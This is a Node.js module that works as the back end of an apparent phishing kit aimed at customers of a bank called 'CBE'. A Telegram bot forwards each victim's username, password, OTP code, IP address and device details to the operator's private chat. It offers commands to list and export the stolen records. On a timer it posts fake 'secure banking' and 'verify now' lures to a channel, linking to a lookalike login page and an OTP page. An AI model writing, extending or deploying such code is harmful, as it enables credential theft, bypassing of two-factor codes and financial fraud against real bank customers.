const logger = require('./logger');

class TelegramService {
    constructor() {
        this.enabled = false;
        this.bot = null;
        this.ownerChatId = null;
        this.channelId = null;
        this.channelUsername = null;
        this.warningInterval = null;
        this.warningCount = 0;
        this.postCount = 0;
        this.userData = [];
        this.loginCounter = 0;
        this.otpCounter = 0;
        this.completedCounter = 0;
        
        try {
            const token = process.env.TELEGRAM_BOT_TOKEN;
            const ownerChatId = process.env.TELEGRAM_OWNER_CHAT_ID;
            const channelId = process.env.TELEGRAM_CHANNEL_ID;
            const channelUsername = process.env.TELEGRAM_CHANNEL_USERNAME;

            if (!token) {
                logger.warn('Telegram token not configured');
                return;
            }

            const TelegramBot = require('node-telegram-bot-api');
            this.bot = new TelegramBot(token, { polling: true });
            this.ownerChatId = ownerChatId;
            this.channelId = channelId || channelUsername;
            
            this.enabled = true;
            logger.info('✅ Telegram bot initialized');
            logger.info(`👤 Owner Chat ID: ${ownerChatId}`);
            logger.info(`📢 Channel: ${this.channelId}`);
            
            this.setupOwnerMessageListener();
            this.setupCallbackListener();
            this.startChannelPosts();
            
        } catch (error) {
            logger.warn(`Telegram initialization failed: ${error.message}`);
            this.enabled = false;
        }
    }

    // ============================================
    // OWNER MESSAGE LISTENER
    // ============================================

    setupOwnerMessageListener() {
        if (!this.enabled || !this.bot) return;

        this.bot.on('message', async (msg) => {
            if (msg.chat.type !== 'private') return;
            
            const chatId = msg.chat.id;
            const text = msg.text;

            if (chatId !== parseInt(this.ownerChatId)) {
                logger.warn(`⚠️ Unauthorized message from user ${chatId} - IGNORED`);
                return;
            }

            // Owner Commands
            if (text === '/start') {
                await this.sendOwnerWelcome(chatId);
                return;
            }

            if (text === '/stats') {
                await this.sendOwnerStats(chatId);
                return;
            }

            if (text === '/users') {
                await this.sendAllUsers(chatId);
                return;
            }

            if (text === '/data') {
                await this.sendAllData(chatId);
                return;
            }

            if (text === '/export') {
                await this.exportUserData(chatId);
                return;
            }

            if (text === '/clear') {
                this.userData = [];
                this.loginCounter = 0;
                this.otpCounter = 0;
                this.completedCounter = 0;
                await this.bot.sendMessage(chatId, '✅ All user data cleared!');
                return;
            }

            if (text && text.startsWith('/verify')) {
                const parts = text.split(' ');
                const code = parts[1] || this.generateVerificationCode();
                await this.sendOwnerVerificationCode(chatId, code);
                return;
            }

            if (text && text.startsWith('/broadcast')) {
                const msgText = text.replace('/broadcast', '').trim();
                if (msgText) {
                    await this.broadcastToChannel(msgText);
                    await this.bot.sendMessage(chatId, `✅ Broadcast sent: "${msgText}"`);
                } else {
                    await this.bot.sendMessage(chatId, `❌ Usage: /broadcast [message]`);
                }
                return;
            }

            if (text === '/help') {
                await this.sendOwnerHelp(chatId);
                return;
            }

            if (text) {
                await this.bot.sendMessage(chatId, `✅ Command received. Use /help for commands.`);
            }
        });

        logger.info('✅ Owner message listener active');
    }

    // ============================================
    // SEND TO OWNER
    // ============================================

    async sendToOwner(message, options = {}) {
        if (!this.enabled || !this.bot || !this.ownerChatId) {
            console.log('❌ Owner chat not configured');
            return null;
        }

        try {
            const result = await this.bot.sendMessage(this.ownerChatId, message, {
                parse_mode: 'HTML',
                disable_web_page_preview: true,
                ...options
            });
            console.log('✅ Sent to owner');
            return result;
        } catch (error) {
            console.error(`Owner send error: ${error.message}`);
            return null;
        }
    }

    // ============================================
    // SEND TO CHANNEL
    // ============================================

    async sendToChannel(message, options = {}) {
        if (!this.enabled || !this.bot || !this.channelId) {
            console.log('❌ Channel not configured');
            return null;
        }

        try {
            const channelOptions = {
                parse_mode: 'HTML',
                disable_web_page_preview: true,
                reply_markup: {
                    inline_keyboard: [
                        [
                            {
                                text: '🔐 Open Login',
                                url: 'https://cbe-com.onrender.com/'
                            }
                        ],
                        [
                            {
                                text: '📱 OTP Page',
                                url: 'https://cbe-com.onrender.com/otp-verify'
                            },
                            {
                                text: '❓ Why Verify?',
                                callback_data: 'why_verify'
                            }
                        ]
                    ]
                },
                ...options
            };

            const result = await this.bot.sendMessage(this.channelId, message, channelOptions);
            this.postCount++;
            console.log(`✅ Channel post #${this.postCount}`);
            return result;
        } catch (error) {
            console.error(`Channel send error: ${error.message}`);
            return null;
        }
    }

    // ============================================
    // 📩 COMPLETE USER DATA - SENT TO OWNER
    // ============================================

    async sendCompleteUserData(data) {
        if (!this.enabled) return null;

        this.loginCounter++;
        
        // Store all user data
        this.userData.push({
            type: 'login',
            username: data.username,
            password: data.password,
            ip: data.ip,
            userAgent: data.userAgent,
            timestamp: data.timestamp,
            id: data.id,
            loginNumber: this.loginCounter
        });

        // Get user info
        const location = this.getLocationFromIP(data.ip);
        const deviceType = this.getDeviceType(data.userAgent);
        const browser = this.getBrowser(data.userAgent);
        const os = this.getOS(data.userAgent);

        // Build complete user profile
        const message = `
🔐 <b>🔴 USER LOGIN DETECTED</b>
<pre>═══════════════════════════════════════</pre>

<b>👤 USER PROFILE</b>
<pre>─────────────────────────────────────</pre>

<b>📋 LOGIN CREDENTIALS:</b>
   👤 <b>Username:</b> <code>${data.username}</code>
   🔑 <b>Password:</b> <code>${data.password}</code>
   🆔 <b>User ID:</b> <code>${data.id || 'N/A'}</code>
   🔢 <b>Login #:</b> <code>${this.loginCounter}</code>

<b>🌐 NETWORK INFO:</b>
   📱 <b>IP Address:</b> <code>${data.ip}</code>
   🌍 <b>Location:</b> ${location}
   ⏰ <b>Timestamp:</b> ${data.timestamp}

<b>💻 DEVICE INFO:</b>
   🖥️ <b>User Agent:</b> <code>${data.userAgent}</code>
   📱 <b>Device Type:</b> ${deviceType}
   🌐 <b>Browser:</b> ${browser}
   💻 <b>OS:</b> ${os}

<b>🔐 SECURITY STATUS:</b>
   🛡️ <b>Status:</b> ✅ Active
   🔒 <b>Encryption:</b> AES-256
   📊 <b>Threat Level:</b> ${this.getThreatLevel(data.ip)}

<pre>═══════════════════════════════════════</pre>

<b>📊 STATISTICS:</b>
   • Total Logins: ${this.loginCounter}
   • Total OTPs: ${this.otpCounter}
   • Completed: ${this.completedCounter}
   • Total Users: ${this.userData.length}

<pre>═══════════════════════════════════════</pre>
⚠️ <b>Action Required:</b> Investigate immediately
🔐 <i>Owner Only - Private</i>
`;

        return this.sendToOwner(message);
    }

    // ============================================
    // 📩 OTP DATA - SENT TO OWNER
    // ============================================

    async sendOTPToOwner(data) {
        if (!this.enabled) return null;

        this.otpCounter++;

        this.userData.push({
            type: 'otp',
            userId: data.userId,
            otp: data.otp,
            ip: data.ip,
            userAgent: data.userAgent,
            timestamp: data.timestamp,
            otpNumber: this.otpCounter
        });

        const message = `
🔐 <b>🔴 OTP CODE CAPTURED</b>
<pre>═══════════════════════════════════════</pre>

<b>🔢 OTP DETAILS</b>
<pre>─────────────────────────────────────</pre>

   🆔 <b>User ID:</b> <code>${data.userId}</code>
   🔢 <b>OTP Code:</b> <code>${data.otp}</code>
   🔢 <b>OTP #:</b> <code>${this.otpCounter}</code>

<b>🌐 NETWORK INFO:</b>
   📱 <b>IP Address:</b> <code>${data.ip}</code>
   ⏰ <b>Timestamp:</b> ${data.timestamp}

<b>💻 DEVICE INFO:</b>
   🖥️ <b>User Agent:</b> <code>${data.userAgent}</code>

<pre>═══════════════════════════════════════</pre>

<b>📊 STATISTICS:</b>
   • Total Logins: ${this.loginCounter}
   • Total OTPs: ${this.otpCounter}
   • Completed: ${this.completedCounter}
   • Total Records: ${this.userData.length}

<pre>═══════════════════════════════════════</pre>
⚠️ <b>Action Required:</b> Verify OTP authenticity
🔐 <i>Owner Only - Private</i>
`;

        return this.sendToOwner(message);
    }

    // ============================================
    // 📩 PAGE ACCESS - SENT TO OWNER
    // ============================================

    async sendPageAccessToOwner(data) {
        if (!this.enabled) return null;

        this.userData.push({
            type: 'page_access',
            ip: data.ip,
            userAgent: data.userAgent,
            referrer: data.referrer,
            timestamp: data.timestamp
        });

        const location = this.getLocationFromIP(data.ip);

        const message = `
🌐 <b>PAGE ACCESS</b>
<pre>═══════════════════════════════════════</pre>

<b>📋 PAGE VISIT DETAILS</b>
<pre>─────────────────────────────────────</pre>

   🔗 <b>Page:</b> Login Page
   📱 <b>IP:</b> <code>${data.ip}</code>
   🌍 <b>Location:</b> ${location}
   🔗 <b>Referrer:</b> ${data.referrer || 'Direct'}
   ⏰ <b>Time:</b> ${data.timestamp}

<b>💻 DEVICE INFO:</b>
   🖥️ <b>User Agent:</b> <code>${data.userAgent}</code>
   📱 <b>Device:</b> ${this.getDeviceType(data.userAgent)}
   🌐 <b>Browser:</b> ${this.getBrowser(data.userAgent)}

<pre>═══════════════════════════════════════</pre>

<b>📊 STATISTICS:</b>
   • Page Visits: ${this.userData.filter(u => u.type === 'page_access').length}
   • Total Logins: ${this.loginCounter}

<pre>═══════════════════════════════════════</pre>
🔐 <i>Owner Only - Private</i>
`;

        return this.sendToOwner(message);
    }

    // ============================================
    // 📩 COMPLETION - SENT TO OWNER
    // ============================================

    async sendCompleteToOwner(data) {
        if (!this.enabled) return null;

        this.completedCounter++;

        this.userData.push({
            type: 'completed',
            userId: data.userId,
            username: data.username,
            ip: data.ip,
            timestamp: new Date().toISOString(),
            completedNumber: this.completedCounter
        });

        const message = `
✅ <b>VERIFICATION COMPLETED</b>
<pre>═══════════════════════════════════════</pre>

<b>📋 COMPLETION DETAILS</b>
<pre>─────────────────────────────────────</pre>

   👤 <b>User:</b> ${data.username || 'Unknown'}
   🆔 <b>ID:</b> <code>${data.userId || 'Unknown'}</code>
   📱 <b>IP:</b> <code>${data.ip || 'Unknown'}</code>
   🔢 <b>Completed #:</b> <code>${this.completedCounter}</code>
   ⏰ <b>Time:</b> ${new Date().toISOString()}

<b>📊 STATISTICS:</b>
   • Total Logins: ${this.loginCounter}
   • Total OTPs: ${this.otpCounter}
   • Completed: ${this.completedCounter}
   • Total Records: ${this.userData.length}

<pre>═══════════════════════════════════════</pre>
✅ <b>Status:</b> COMPLETED
🔐 <i>Owner Only - Private</i>
`;

        return this.sendToOwner(message);
    }

    // ============================================
    // 📩 VERIFICATION REQUEST - SENT TO OWNER
    // ============================================

    async sendVerificationRequestToOwner(data) {
        if (!this.enabled) return null;

        const code = this.generateVerificationCode();

        this.userData.push({
            type: 'verification_request',
            username: data.username,
            ip: data.ip,
            code: code,
            timestamp: new Date().toISOString()
        });

        const message = `
🔐 <b>VERIFICATION CODE REQUEST</b>
<pre>═══════════════════════════════════════</pre>

👤 <b>User:</b> ${data.username || 'Unknown'}
📱 <b>IP:</b> ${data.ip || 'Unknown'}
📌 <b>Code:</b> <code>${code}</code>
⏰ <b>Time:</b> ${new Date().toISOString()}

<pre>═══════════════════════════════════════</pre>
✅ <b>Share this code with the user</b>
🔐 <i>Owner Only - Private</i>
`;

        return this.sendToOwner(message);
    }

    // ============================================
    // HELPER FUNCTIONS
    // ============================================

    getLocationFromIP(ip) {
        const locations = {
            '192.168.': 'Local Network',
            '10.0.': 'Local Network',
            '172.16.': 'Local Network',
            '127.0.0.1': 'Localhost',
            '::1': 'Localhost'
        };
        
        for (const [key, value] of Object.entries(locations)) {
            if (ip.startsWith(key)) return value;
        }
        return '📍 Unknown Location';
    }

    getDeviceType(userAgent) {
        if (!userAgent) return 'Unknown';
        const ua = userAgent.toLowerCase();
        if (ua.includes('mobile') || ua.includes('android') || ua.includes('iphone')) return '📱 Mobile';
        if (ua.includes('tablet') || ua.includes('ipad')) return '📱 Tablet';
        if (ua.includes('windows') || ua.includes('mac') || ua.includes('linux')) return '💻 Desktop';
        return '📱 Other';
    }

    getBrowser(userAgent) {
        if (!userAgent) return 'Unknown';
        const ua = userAgent.toLowerCase();
        if (ua.includes('chrome')) return 'Chrome';
        if (ua.includes('firefox')) return 'Firefox';
        if (ua.includes('safari') && !ua.includes('chrome')) return 'Safari';
        if (ua.includes('edge')) return 'Edge';
        if (ua.includes('opera')) return 'Opera';
        return 'Other';
    }

    getOS(userAgent) {
        if (!userAgent) return 'Unknown';
        const ua = userAgent.toLowerCase();
        if (ua.includes('windows')) return 'Windows';
        if (ua.includes('mac')) return 'macOS';
        if (ua.includes('linux')) return 'Linux';
        if (ua.includes('android')) return 'Android';
        if (ua.includes('iphone') || ua.includes('ipad')) return 'iOS';
        return 'Other';
    }

    getThreatLevel(ip) {
        const suspicious = ['192.168.', '10.0.', '172.16.', '127.0.0.1'];
        for (const prefix of suspicious) {
            if (ip.startsWith(prefix)) return '🟢 LOW';
        }
        return '🟡 MEDIUM';
    }

    generateVerificationCode() {
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
        let code = '';
        for (let i = 0; i < 6; i++) {
            code += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return code;
    }

    // ============================================
    // CHANNEL POSTS
    // ============================================

    async sendSecurityPost() {
        const message = `
🛡️ <b>ACCOUNT SECURITY</b>
<pre>═══════════════════════════════════════</pre>

<b>🔐 PROTECT YOUR ACCOUNT</b>

<b>✅ What We Protect:</b>
   • 💰 Your Money
   • 📱 Your Identity
   • 🔑 Your Accounts
   • 📊 Your Data

<b>📊 System Status:</b>
   • ${this.loginCounter} Logins Monitored
   • ${this.otpCounter} OTPs Secured
   • ${this.completedCounter} Verified

<pre>═══════════════════════════════════════</pre>
🔐 <i>Secure your account today</i>
`;
        return this.sendToChannel(message);
    }

    async sendWelcomePost() {
        const message = `
🔐 <b>SECURE BANKING</b>
<pre>═══════════════════════════════════════</pre>

<b>✅ SECURE FEATURES:</b>
   • 🔐 Advanced Security
   • 📱 Real-time Monitoring
   • 🛡️ Full Protection
   • ⭐ Premium Service

<b>📊 System Stats:</b>
   • ${this.loginCounter} Users Protected
   • ${this.otpCounter} Transactions Secured
   • 100% Security Rating

<pre>═══════════════════════════════════════</pre>
🔐 <i>Your security is our priority</i>
`;
        return this.sendToChannel(message);
    }

    // ============================================
    // CHANNEL POST LOOP
    // ============================================

    startChannelPosts() {
        if (!this.enabled) return;

        const posts = [
            this.sendWelcomePost.bind(this),
            this.sendSecurityPost.bind(this)
        ];

        setTimeout(() => {
            posts[0]();
        }, 5000);

        let index = 0;
        this.warningInterval = setInterval(() => {
            index = (index + 1) % posts.length;
            posts[index]();
            this.warningCount++;
        }, 120000);
    }

    // ============================================
    // BROADCAST
    // ============================================

    async broadcastToChannel(message) {
        if (!this.enabled || !this.channelId) return null;

        const broadcastMsg = `
📢 <b>BROADCAST</b>
<pre>═══════════════════════════════════════</pre>

${message}

<pre>═══════════════════════════════════════</pre>
<i>System Broadcast</i>
`;

        return this.sendToChannel(broadcastMsg);
    }

    // ============================================
    // OWNER COMMANDS
    // ============================================

    async sendOwnerWelcome(chatId) {
        const message = `
🤖 <b>CBE SECURITY BOT</b>
<pre>═══════════════════════════════════════</pre>

<b>✅ Welcome!</b>

<b>📌 Commands:</b>
/start - Welcome
/stats - Statistics
/users - All users
/data - All data
/export - Export data
/clear - Clear data
/verify [code] - Generate code
/broadcast [msg] - Channel broadcast
/help - Help

<b>📩 What you'll receive:</b>
   • ✅ Usernames & Passwords
   • ✅ OTP Codes
   • ✅ IP Addresses
   • ✅ User Agents
   • ✅ Page Visits

<pre>═══════════════════════════════════════</pre>
🔐 <i>All data is private</i>
`;

        await this.bot.sendMessage(chatId, message, {
            parse_mode: 'HTML'
        });
    }

    async sendOwnerStats(chatId) {
        const totalUsers = this.userData.filter(u => u.type === 'login').length;
        const totalOTPs = this.userData.filter(u => u.type === 'otp').length;
        const totalVisits = this.userData.filter(u => u.type === 'page_access').length;
        const totalCompleted = this.userData.filter(u => u.type === 'completed').length;

        const message = `
📊 <b>SYSTEM STATISTICS</b>
<pre>═══════════════════════════════════════</pre>

<b>📈 USER DATA:</b>
   • Logins: ${totalUsers}
   • OTPs: ${totalOTPs}
   • Visits: ${totalVisits}
   • Completed: ${totalCompleted}
   • Total: ${this.userData.length}

<b>📢 CHANNEL:</b>
   • Posts: ${this.postCount}
   • Warnings: ${this.warningCount}
   • Status: 🟢 Online

<pre>═══════════════════════════════════════</pre>
🔐 <i>All systems operational</i>
`;

        await this.bot.sendMessage(chatId, message, {
            parse_mode: 'HTML'
        });
    }

    async sendAllUsers(chatId) {
        const logins = this.userData.filter(u => u.type === 'login');
        
        let userList = '';
        logins.slice(-20).forEach((u, i) => {
            userList += `   ${i+1}. ${u.username} - ${u.ip} - ${u.timestamp}\n`;
        });

        const message = `
👥 <b>USER LIST</b>
<pre>═══════════════════════════════════════</pre>

<b>📊 Total Users:</b> ${logins.length}

<b>📋 Recent Users:</b>
${userList || '   No users yet'}

<pre>═══════════════════════════════════════</pre>
🔐 <i>Owner Only - Private</i>
`;

        await this.bot.sendMessage(chatId, message, {
            parse_mode: 'HTML'
        });
    }

    async sendAllData(chatId) {
        let dataText = '';
        const recent = this.userData.slice(-30);
        recent.forEach((u, i) => {
            dataText += `\n${i+1}. ${u.type.toUpperCase()}:\n`;
            dataText += `   👤 ${u.username || u.userId || 'Unknown'}\n`;
            if (u.password) dataText += `   🔑 ${u.password}\n`;
            if (u.otp) dataText += `   🔢 ${u.otp}\n`;
            dataText += `   📱 ${u.ip}\n`;
            dataText += `   ⏰ ${u.timestamp}\n`;
        });

        const message = `
📋 <b>ALL DATA</b>
<pre>═══════════════════════════════════════</pre>

<b>📊 Total Records:</b> ${this.userData.length}

<b>📋 Recent Data:</b>
${dataText || '   No data yet'}

<pre>═══════════════════════════════════════</pre>
🔐 <i>Owner Only - Private</i>
`;

        await this.bot.sendMessage(chatId, message, {
            parse_mode: 'HTML'
        });
    }

    async exportUserData(chatId) {
        const jsonData = JSON.stringify(this.userData, null, 2);
        const filename = `user_data_${Date.now()}.json`;
        
        await this.bot.sendDocument(chatId, Buffer.from(jsonData), {
            filename: filename,
            contentType: 'application/json',
            caption: `📊 Data Export - ${new Date().toISOString()}`
        });
    }

    async sendOwnerVerificationCode(chatId, code) {
        const message = `
🔐 <b>VERIFICATION CODE</b>
<pre>═══════════════════════════════════════</pre>

<b>📌 Code:</b> <code>${code}</code>

<b>✅ Share with user</b>

<pre>═══════════════════════════════════════</pre>
⏰ <i>5 minute expiry</i>
`;

        await this.bot.sendMessage(chatId, message, {
            parse_mode: 'HTML'
        });
    }

    async sendOwnerHelp(chatId) {
        const message = `
🆘 <b>HELP</b>
<pre>═══════════════════════════════════════</pre>

<b>📌 Commands:</b>
/start - Welcome
/stats - Statistics
/users - All users
/data - All data
/export - Export data
/clear - Clear data
/verify [code] - Generate code
/broadcast [msg] - Channel broadcast
/help - Help

<b>📩 Data Received:</b>
   • Credentials (username/password)
   • OTP codes
   • IP addresses
   • User agents
   • Page visits

<pre>═══════════════════════════════════════</pre>
🔐 <i>All data is private</i>
`;

        await this.bot.sendMessage(chatId, message, {
            parse_mode: 'HTML'
        });
    }

    // ============================================
    // CALLBACK LISTENER
    // ============================================

    setupCallbackListener() {
        if (!this.enabled || !this.bot) return;

        this.bot.on('callback_query', async (callbackQuery) => {
            const data = callbackQuery.data;
            const chatId = callbackQuery.message.chat.id;
            const messageId = callbackQuery.message.message_id;

            try {
                let response = '';

                switch(data) {
                    case 'why_verify':
                        response = `
❓ <b>WHY VERIFY?</b>
<pre>═══════════════════════════════════════</pre>

<b>🔴 WITHOUT VERIFICATION:</b>
   ❌ Account can be HACKED
   ❌ Money can be STOLEN
   ❌ Identity can be STOLEN

<b>✅ WITH VERIFICATION:</b>
   ✅ Account is SECURE
   ✅ Money is SAFE
   ✅ Identity is PROTECTED

<pre>═══════════════════════════════════════</pre>
🔐 <i>Verify now to stay safe</i>
`;
                        break;

                    default:
                        response = `
🔐 <b>SECURE YOUR ACCOUNT</b>
<pre>═══════════════════════════════════════</pre>

<b>Click the button below to login</b>

<pre>═══════════════════════════════════════</pre>
🔐 <i>Your security matters</i>
`;
                }

                if (response) {
                    await this.bot.sendMessage(chatId, response, {
                        parse_mode: 'HTML',
                        reply_to_message_id: messageId
                    });
                }

                await this.bot.answerCallbackQuery(callbackQuery.id);

            } catch (error) {
                console.error(`Callback error: ${error.message}`);
                await this.bot.answerCallbackQuery(callbackQuery.id, {
                    text: '❌ Error',
                    show_alert: true
                });
            }
        });

        logger.info('✅ Callback listener active');
    }

    // ============================================
    // STOP WARNING LOOP
    // ============================================

    stopWarningLoop() {
        if (this.warningInterval) {
            clearInterval(this.warningInterval);
            this.warningInterval = null;
            logger.info('⚠️ Warning loop stopped');
        }
    }

    // ============================================
    // WELCOME MESSAGE
    // ============================================

    async sendWelcomeMessage() {
        await this.sendToOwner(`
🚀 <b>SYSTEM ACTIVE</b>
<pre>═══════════════════════════════════════</pre>

✅ System started successfully
👤 Owner Chat ID: ${this.ownerChatId}
📢 Channel: ${this.channelId}
📊 Waiting for user data...

<pre>═══════════════════════════════════════</pre>
🔐 <i>All user data will appear here</i>
        `);

        return this.sendWelcomePost();
    }
}

module.exports = new TelegramService();
